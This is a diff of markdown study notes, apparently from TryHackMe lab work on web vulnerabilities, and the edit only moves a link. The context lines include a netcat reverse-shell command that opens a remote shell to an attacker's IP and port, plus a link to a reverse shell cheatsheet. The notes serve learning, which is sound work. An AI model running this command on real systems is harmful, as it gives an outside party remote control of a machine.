@@ -10,7 +10,7 @@ Some versions of netcat support a -e flag that hooks STDIN and STDOUT of an exec
 nc -e /bin/bash $LOCAL_IP $LOCAL_PORT
 ```
 
-I’m pretty sure that this would have allowed us to avoid all of the named-pipe-magic that Metsploit generated [a couple of days ago](2021-10-02-tryhackme-complete-beginner.md)… Though I’m also pretty sure that Metasploit’s code is more robust (since it will work with versions of nc that *don’t* support the -e flag).
+I’m pretty sure that this would have allowed us to avoid all of the named-pipe-magic that Metsploit generated a couple of days ago… Though I’m also pretty sure that Metasploit’s code is more robust (since it will work with versions of nc that *don’t* support the -e flag).
 
 [A library of reverse shell methods.](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md)
 
@@ -19,6 +19,8 @@ Injection attacks can be divided into two broad classes:
 BLIND attacks are ones where command output is not returned to the attacker in a server response.
 
 ACTIVE attacks are those where the command output *is* returned to the attacker in a server response.
+
+* [2021-10-02 TryHackMe: Complete Beginner](2021-10-02-tryhackme-complete-beginner.md)
 
 ### (Severity 02) Broken Authentication
 
